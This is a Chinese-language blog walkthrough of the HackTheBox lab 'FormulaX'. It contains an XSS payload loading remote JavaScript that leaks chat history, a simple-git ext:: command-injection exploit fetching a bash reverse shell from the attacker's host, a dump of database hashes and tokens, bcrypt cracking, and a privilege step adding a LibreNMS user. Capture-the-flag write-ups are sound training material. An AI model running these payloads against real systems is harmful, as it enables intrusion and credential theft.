<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>FormulaX - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="靶场信息  信息收集Nmap┌──(root㉿kali)-[~] └─# nmap -sC -sV -A -p- --min-rate&#x3D;10000 10.10.11.6   Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-03-11 13:34 CST Nmap scan report for 10.10.11.6 Host is up (0.">
<meta property="og:type" content="article">
<meta property="og:title" content="FormulaX - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="靶场信息  信息收集Nmap┌──(root㉿kali)-[~] └─# nmap -sC -sV -A -p- --min-rate&#x3D;10000 10.10.11.6   Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-03-11 13:34 CST Nmap scan report for 10.10.11.6 Host is up (0.">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/FormulaX.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/image-20240311133952596.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/image-20240311134125532.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/image-20240311134712757.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/image-20240312135816549.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/image-20240312143435014.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/image-20240312150205169.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/image-20240312151528307.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/image-20240312151912248.png">
<meta property="og:image" content="http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/image-20240312103136310.png">
<meta property="article:published_time" content="2024-03-09T16:00:00.000Z">
<meta property="article:modified_time" content="2025-02-24T08:45:11.002Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2024/03/10/Hackthebox/Hard/FormulaX/FormulaX.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/lucifiel" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                请我喝咖啡
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">FormulaX - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">FormulaX - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2024-03-09T16:00:00.000Z" itemprop="datePublished" class="page-time">
  2024-03-10
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#js"><span class="post-toc-text">js</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#dev-git-auto-update-chatbot-htb"><span class="post-toc-text">dev-git-auto-update.chatbot.htb</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#frank-dorky"><span class="post-toc-text">frank_dorky</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#librenms"><span class="post-toc-text">librenms</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#kai-relay"><span class="post-toc-text">kai_relay</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Root"><span class="post-toc-text">Root</span></a></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Hard/FormulaX"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">FormulaX - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2024-03-10 00:00:00" datetime="2024-03-09T16:00:00.000Z"  itemprop="datePublished">2024-03-10</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2024/03/10/Hackthebox/Hard/FormulaX/FormulaX.png" class title="FormulaX">

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code>┌──(root㉿kali)-[~]
└─# nmap -sC -sV -A -p- --min-rate=10000 10.10.11.6  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-11 13:34 CST
Nmap scan report for 10.10.11.6
Host is up (0.16s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA)
|_  256 b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-cors: GET POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
|_Requested resource was /static/index.html
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/11%OT=22%CT=1%CU=42250%PV=Y%DS=2%DC=T%G=Y%TM=65EE
OS:97FB%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=108%GCD=3%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53AST11NW7%O2=M53AS
OS:T11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=
OS:FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=
OS:M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)
OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G
OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   188.54 ms 10.10.16.1
2   74.38 ms  10.10.11.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.67 seconds
</code></pre>
<pre><code>echo &quot;10.10.11.6 formulax.htb&quot; &gt;&gt; /etc/hosts
</code></pre>
<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><img src="/2024/03/10/Hackthebox/Hard/FormulaX/image-20240311133952596.png" class title="image-20240311133952596">

<p>一个登录页面，看起来可以注册账号</p>
<img src="/2024/03/10/Hackthebox/Hard/FormulaX/image-20240311134125532.png" class title="image-20240311134125532">

<p>注册一个账号，然后登入看看有没有什么东西</p>
<img src="/2024/03/10/Hackthebox/Hard/FormulaX/image-20240311134712757.png" class title="image-20240311134712757">

<p>这里有一个留言窗口，可以尝试下xss</p>
<pre><code>python3 -m http.server 80
</code></pre>
<img src="/2024/03/10/Hackthebox/Hard/FormulaX/image-20240312135816549.png" class title="image-20240312135816549">

<pre><code> ✘ lucifiel@MacBookPro  ~  python3 -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.11.6 - - [12/Mar/2024 13:58:24] &quot;GET / HTTP/1.1&quot; 200 -
</code></pre>
<p>可以收到请求</p>
<p>在机器人页面发现两个js文件</p>
<blockquote>
<p><a href="http://formulax.htb/socket.io/socket.io.js" target="_blank" rel="noopener">http://formulax.htb/socket.io/socket.io.js</a></p>
<p><a href="http://formulax.htb/restricted/chat.js" target="_blank" rel="noopener">http://formulax.htb/restricted/chat.js</a></p>
</blockquote>
<p>从代码来看Show_messages_on_screen_of_Server函数是直接将接收到的value变量直接查到html中，也就是将用户发送的内容直接插入到html中，未进行过滤，所以有xss攻击，我们来编写一个js进行利用</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><pre><code>let value;
const res = axios.get(`/user/api/chat`);
const socket = io(&#39;/&#39;,{withCredentials: true});


//listening for the messages
socket.on(&#39;message&#39;, (my_message) =&gt; {

  //console.log(&quot;Received From Server: &quot; + my_message)
  // Show_messages_on_screen_of_Server(my_message)
  //
  fetch(&quot;http://10.10.16.23/?&quot; + my_message );

})

// rewrite the typing_chat function to only send message &#39;history&#39;
const typing_chat_new = () =&gt; {
  value = &quot;history&quot;; //document.getElementById(&#39;user_message&#39;).value
  if (value) {
    // sending the  messages to the server
    socket.emit(&#39;client_message&#39;, value)
    Show_messages_on_screen_of_Client(value);
    // here we will do out socket things..
    document.getElementById(&#39;user_message&#39;).value = &quot;&quot;
  }
  else {
    alert(&quot;Cannot send Empty Messages&quot;);
  }

}

// send message
typing_chat_new()
</code></pre>
<pre><code>&lt;img src=x onerror=&quot;body.appendChild(createElement(&#39;script&#39;)).src=&#39;/socket.io/socket.io.js&#39;&quot;&gt;&lt;img src=x onerror=&quot;body.appendChild(createElement(&#39;script&#39;)).src=&#39;http://10.10.16.23:8080/evil.js&#39;&quot;&gt;&lt;/img&gt;
</code></pre>
<pre><code>Serving HTTP on :: port 8080 (http://[::]:8080/) ...
::ffff:10.10.11.6 - - [12/Mar/2024 14:30:14] &quot;GET /evil.js HTTP/1.1&quot; 200 -
::ffff:10.10.11.6 - - [12/Mar/2024 14:30:16] &quot;GET /evil.js HTTP/1.1&quot; 200 -
::ffff:10.10.11.6 - - [12/Mar/2024 14:30:21] &quot;GET /evil.js HTTP/1.1&quot; 200 -
::ffff:10.10.11.6 - - [12/Mar/2024 14:30:22] &quot;GET /evil.js HTTP/1.1&quot; 200 -
::ffff:10.10.11.6 - - [12/Mar/2024 14:30:28] &quot;GET /evil.js HTTP/1.1&quot; 200 -
</code></pre>
<pre><code> lucifiel@MacBookPro  ~  python3 -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:10.10.11.6 - - [12/Mar/2024 14:30:18] code 501, message Unsupported method (&#39;OPTIONS&#39;)
::ffff:10.10.11.6 - - [12/Mar/2024 14:30:18] &quot;OPTIONS /?Message%20Sent:%3Cbr%3Ehistory HTTP/1.1&quot; 501 -
::ffff:10.10.11.6 - - [12/Mar/2024 14:30:18] code 501, message Unsupported method (&#39;OPTIONS&#39;)
::ffff:10.10.11.6 - - [12/Mar/2024 14:30:18] &quot;OPTIONS /?Write%20a%20script%20to%20automate%20the%20auto-update HTTP/1.1&quot; 501 -
::ffff:10.10.11.6 - - [12/Mar/2024 14:30:19] code 501, message Unsupported method (&#39;OPTIONS&#39;)
::ffff:10.10.11.6 - - [12/Mar/2024 14:30:19] &quot;OPTIONS /?Message%20Sent:%3Cbr%3Ewhoami HTTP/1.1&quot; 501 -
::ffff:10.10.11.6 - - [12/Mar/2024 14:30:19] code 501, message Unsupported method (&#39;OPTIONS&#39;)
::ffff:10.10.11.6 - - [12/Mar/2024 14:30:19] &quot;OPTIONS /?Message%20Sent:%3Cbr%3Ehistory HTTP/1.1&quot; 501 -
::ffff:10.10.11.6 - - [12/Mar/2024 14:30:20] code 501, message Unsupported method (&#39;OPTIONS&#39;)
::ffff:10.10.11.6 - - [12/Mar/2024 14:30:20] &quot;OPTIONS /?Message%20Sent:%3Cbr%3Ehistory HTTP/1.1&quot; 501 -
::ffff:10.10.11.6 - - [12/Mar/2024 14:30:25] code 501, message Unsupported method (&#39;OPTIONS&#39;)
::ffff:10.10.11.6 - - [12/Mar/2024 14:30:25] &quot;OPTIONS /?Write%20a%20script%20for%20%20dev-git-auto-update.chatbot.htb%20to%20work%20properly HTTP/1.1&quot; 501 -
::ffff:10.10.11.6 - - [12/Mar/2024 14:30:26] code 501, message Unsupported method (&#39;OPTIONS&#39;)
::ffff:10.10.11.6 - - [12/Mar/2024 14:30:26] &quot;OPTIONS /?Message%20Sent:%3Cbr%3Ehistory HTTP/1.1&quot; 501 -
</code></pre>
<p>得到了一个新域名 <code>dev-git-auto-update.chatbot.htb</code>，去加入hosts解析</p>
<pre><code>echo &quot;10.10.11.6 dev-git-auto-update.chatbot.htb&quot; &gt;&gt; /etc/hosts
</code></pre>
<h2 id="dev-git-auto-update-chatbot-htb"><a href="#dev-git-auto-update-chatbot-htb" class="headerlink" title="dev-git-auto-update.chatbot.htb"></a>dev-git-auto-update.chatbot.htb</h2><img src="/2024/03/10/Hackthebox/Hard/FormulaX/image-20240312143435014.png" class title="image-20240312143435014">

<p>访问新域名，得到了一个cms版本 <code>simple-git v3.14</code></p>
<blockquote>
<p><a href="https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221" target="_blank" rel="noopener">https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221</a></p>
</blockquote>
<p>找到了一篇文章，里面有 poc</p>
<pre><code>const simpleGit = require(&#39;simple-git&#39;)
const git2 = simpleGit()
git2.clone(&#39;ext::sh -c touch% /tmp/pwn% &gt;&amp;2&#39;, &#39;/tmp/example-new-repo&#39;, [&quot;-c&quot;, &quot;protocol.ext.allow=always&quot;]);
</code></pre>
<p>接着在本地写入一个shell.sh文件</p>
<pre><code>/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.23/4444 0&gt;&amp;1
</code></pre>
<p>然后用python3打开一个http服务</p>
<pre><code>python3 -m http.server 80
</code></pre>
<p>再然后使用 nc 开启一个端口监听</p>
<pre><code>nc -nvlp 4444
</code></pre>
<p>最后直接在页面的文本款中输入我们的poc</p>
<pre><code>ext::sh -c curl% http://10.10.16.23/shell.sh|bash &gt;&amp;2
</code></pre>
<pre><code> lucifiel@MacBookPro  ~  nc -nvlp 4444
Connection from 10.10.11.6:48996
bash: cannot set terminal process group (1166): Inappropriate ioctl for device
bash: no job control in this shell
www-data@formulax:~/git-auto-update$ whoami&amp;&amp;id
whoami&amp;&amp;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<p>成功获得一个 shell</p>
<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="frank-dorky"><a href="#frank-dorky" class="headerlink" title="frank_dorky"></a>frank_dorky</h2><pre><code>www-data@formulax:~/git-auto-update$ ps aux
ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
mongodb      933  0.8  2.6 1525096 103660 ?      Ssl  05:01   0:48 /usr/bin/mongod --config /etc/mongod.conf
</code></pre>
<p>查看了一下进程，确认有 mongodb</p>
<p>直接输入mongo进入数据库，列出所有db</p>
<pre><code>www-data@formulax:~/git-auto-update$ mongo
mongo
MongoDB shell version v4.4.29
connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&amp;gssapiServiceName=mongodb
Implicit session: session { &quot;id&quot; : UUID(&quot;84ec051f-5052-4faa-81f7-d6863e265a40&quot;) }
MongoDB server version: 4.4.8

show dbs
admin    0.000GB
config   0.000GB
local    0.000GB
testing  0.000GB
</code></pre>
<p>有一个testing，去查看一下</p>
<pre><code>use testing
switched to db testing

show collections
messages
users

db.users.find()
{ &quot;_id&quot; : ObjectId(&quot;648874de313b8717284f457c&quot;), &quot;name&quot; : &quot;admin&quot;, &quot;email&quot; : &quot;admin@chatbot.htb&quot;, &quot;password&quot; : &quot;$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.&quot;, &quot;terms&quot; : true, &quot;value&quot; : true, &quot;authorization_token&quot; : &quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MTAyMjU5NDR9.pAJbtEOCYK8GsKpGJe7GHQYyx6ZaG_aiKQudRdZB9Us&quot;, &quot;__v&quot; : 0 }
{ &quot;_id&quot; : ObjectId(&quot;648874de313b8717284f457d&quot;), &quot;name&quot; : &quot;frank_dorky&quot;, &quot;email&quot; : &quot;frank_dorky@chatbot.htb&quot;, &quot;password&quot; : &quot;$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6&quot;, &quot;terms&quot; : true, &quot;value&quot; : true, &quot;authorization_token&quot; : &quot; &quot;, &quot;__v&quot; : 0 }
{ &quot;_id&quot; : ObjectId(&quot;65eff01ba36089eab68a388e&quot;), &quot;name&quot; : &quot;TEST&quot;, &quot;email&quot; : &quot;test1@exmaple.com&quot;, &quot;password&quot; : &quot;$2b$10$8DF90lVfdJx72qN38yjdSe1ivVuOYc044ndsKz2jvzlwyQ/.tpeXO&quot;, &quot;terms&quot; : true, &quot;value&quot; : false, &quot;authorization_token&quot; : &quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NWVmZjAxYmEzNjA4OWVhYjY4YTM4OGUiLCJpYXQiOjE3MTAyMjMzOTd9.vR779XvSJclrpm-l-PjxzJAUkqQwwWyY6y48gtprbFA&quot;, &quot;__v&quot; : 0 }
{ &quot;_id&quot; : ObjectId(&quot;65eff0fea36089eab68a3a9a&quot;), &quot;name&quot; : &quot;e&quot;, &quot;email&quot; : &quot;test1@example.com&quot;, &quot;password&quot; : &quot;$2b$10$oePFDDjj0eSucBsBVj4pPuYR1fQ3KF1IVJG2h12.2ZdZfZA3ksqM2&quot;, &quot;terms&quot; : true, &quot;value&quot; : false, &quot;authorization_token&quot; : &quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NWVmZjBmZWEzNjA4OWVhYjY4YTNhOWEiLCJpYXQiOjE3MTAyMjU3MzN9.Y8Z84ZKNArlDlELezDgjSR9MsEC-FqTB6srf7f9GyhY&quot;, &quot;__v&quot; : 0 }
{ &quot;_id&quot; : ObjectId(&quot;65eff3c5a36089eab68a40d2&quot;), &quot;name&quot; : &quot;lucifiel&quot;, &quot;email&quot; : &quot;lucifiel@htb.com&quot;, &quot;password&quot; : &quot;$2b$10$ag943jUoiSpXn9yjxcIkauY0pFjaNjBYGWQl4eeUgmiHQ7DFTiVse&quot;, &quot;terms&quot; : true, &quot;value&quot; : false, &quot;authorization_token&quot; : &quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NWVmZjNjNWEzNjA4OWVhYjY4YTQwZDIiLCJpYXQiOjE3MTAyMjQzMzZ9.Xmm5odCkE_axrTju8u1eAGMJHXdOz3BFJ6e_LBdJB0A&quot;, &quot;__v&quot; : 0 }
{ &quot;_id&quot; : ObjectId(&quot;65eff89da36089eab68a4c08&quot;), &quot;name&quot; : &quot;Mariquita&quot;, &quot;email&quot; : &quot;mariquita@gmail.com&quot;, &quot;password&quot; : &quot;$2b$10$GoZTfwxfFP3eoezL9VAlG.lv1z10zmDNQ/tmIuGyKzqeDy7Y1bZZu&quot;, &quot;terms&quot; : true, &quot;value&quot; : false, &quot;authorization_token&quot; : &quot; &quot;, &quot;__v&quot; : 0 }
{ &quot;_id&quot; : ObjectId(&quot;65eff8d8a36089eab68a4c90&quot;), &quot;name&quot; : &quot;Mariquita&quot;, &quot;email&quot; : &quot;mari@gmail.com&quot;, &quot;password&quot; : &quot;$2b$10$as//XfN5RWL5OfnhYAswD.hsRovBcuYhF0I.sFi7UdrVhb16MSYWC&quot;, &quot;terms&quot; : true, &quot;value&quot; : false, &quot;authorization_token&quot; : &quot; &quot;, &quot;__v&quot; : 0 }
{ &quot;_id&quot; : ObjectId(&quot;65eff922a36089eab68a4d36&quot;), &quot;name&quot; : &quot;Lucy&quot;, &quot;email&quot; : &quot;lucy@gmail.com&quot;, &quot;password&quot; : &quot;$2b$10$CEkZlIQ2GfmKm3.9VQ0fX.pBevxLdwWpNp9ZJ/ddftVmdwHQZRsIm&quot;, &quot;terms&quot; : true, &quot;value&quot; : false, &quot;authorization_token&quot; : &quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NWVmZjkyMmEzNjA4OWVhYjY4YTRkMzYiLCJpYXQiOjE3MTAyMjU3MjN9.S7Cmmq4frajBRIE2uNLwFyQDi_QfgI3cfYcSoIYIOt8&quot;, &quot;__v&quot; : 0 }
</code></pre>
<p>拿到了一堆hash，整理一下，并且经过查看&#x2F;etc&#x2F;passwd后发现，只有frank_dorky是我们要的账户，整理好后拿去john爆破一下</p>
<pre><code>frank_dorky:$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6
</code></pre>
<pre><code> lucifiel@MacBookPro  ~  john --wordlist=&quot;/usr/share/wordlists/rockyou.txt&quot; hash
 
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
manchesterunited (frank_dorky)
1g 0:00:00:55 100% 0.01787g/s 49.98p/s 49.98c/s 49.98C/s siobhan..charley
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
</code></pre>
<p>成功得到了一个账号密码</p>
<pre><code>username = frank_dorky
password = manchesterunited
</code></pre>
<pre><code> lucifiel@MacBookPro  ~  ssh  frank_dorky@10.10.11.6
frank_dorky@10.10.11.6&#39;s password:
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the &#39;unminimize&#39; command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Mar 12 05:10:13 2024 from 10.10.14.224
frank_dorky@formulax:~$ whoami&amp;&amp;id
frank_dorky
uid=1002(frank_dorky) gid=1002(frank_dorky) groups=1002(frank_dorky)
</code></pre>
<p>成功使用一个ssh登入</p>
<pre><code>frank_dorky@formulax:~$ ls
user.txt
frank_dorky@formulax:~$ cat user.txt
357f4017dba4420603478c008f8cebef
</code></pre>
<p>成功拿到 user 权限的 flag 文件</p>
<h2 id="librenms"><a href="#librenms" class="headerlink" title="librenms"></a>librenms</h2><pre><code>Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8082          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:2002          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:38173         0.0.0.0:*               LISTEN
</code></pre>
<p>查看一下端口，发现有一个3000端口比较可疑，给它转发出来看看</p>
<pre><code>ssh -L:3000:127.0.0.1:3000 frank_dorky@10.10.11.6
</code></pre>
<img src="/2024/03/10/Hackthebox/Hard/FormulaX/image-20240312150205169.png" class title="image-20240312150205169">

<p>访问<a href="http://127.0.0.1:3000/" target="_blank" rel="noopener">http://127.0.0.1:3000</a></p>
<p>发现是一个librenms，然后使用搜索到的默认密码<code>D32fwefwef</code>去进行登录，却登录失败了，不过找到了一篇文章，提示我们可以自己添加一个用户</p>
<blockquote>
<p><a href="https://community.librenms.org/t/adding-admin-users-on-librenms/20782" target="_blank" rel="noopener">https://community.librenms.org/t/adding-admin-users-on-librenms/20782</a></p>
</blockquote>
<pre><code>frank_dorky@formulax:/opt/librenms$ pwd
/opt/librenms
frank_dorky@formulax:/opt/librenms$ ls
ls: cannot open directory &#39;.&#39;: Permission denied
</code></pre>
<p>找到了adduser.php所在的目录，不过我们没有查看权限，尝试下是否可以添加吧</p>
<pre><code>frank_dorky@formulax:/opt/librenms$ ./adduser.php lucifiel lucifiel 10
User lucifiel added successfully
</code></pre>
<p>成功添加，使用我们创建的账号密码去进行登录</p>
<img src="/2024/03/10/Hackthebox/Hard/FormulaX/image-20240312151528307.png" class title="image-20240312151528307">

